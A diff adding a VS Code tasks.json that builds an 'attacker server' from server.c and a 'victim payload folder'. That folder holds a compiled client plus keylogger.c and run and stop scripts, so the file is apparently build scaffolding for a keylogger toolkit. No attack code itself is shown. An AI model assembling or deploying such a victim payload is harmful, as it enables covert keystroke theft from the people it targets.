@@ -1,0 +1,39 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Build Attacker Server",
+            "type": "shell",
+            "command": "mkdir -p out && gcc server.c -o out/server -pthread",
+            "group": "build",
+            "presentation": {
+                "reveal": "always",
+                "panel": "shared"
+            },
+            "problemMatcher": []
+        },
+        {
+            "label": "Build Victim Payload Folder",
+            "type": "shell",
+            "command": "mkdir -p victim && gcc client.c -o victim/client && cp Makefile keylogger.c klrun.sh klstop.sh victim/ && chmod +x victim/klrun.sh victim/klstop.sh",
+            "group": "build",
+            "presentation": {
+                "reveal": "always",
+                "panel": "shared"
+            },
+            "problemMatcher": []
+        },
+        {
+            "label": "Build ALL (Attacker & Victim)",
+            "dependsOn": [
+                "Build Attacker Server",
+                "Build Victim Payload Folder"
+            ],
+            "group": {
+                "kind": "build",
+                "isDefault": true
+            },
+            "problemMatcher": []
+        }
+    ]
+}
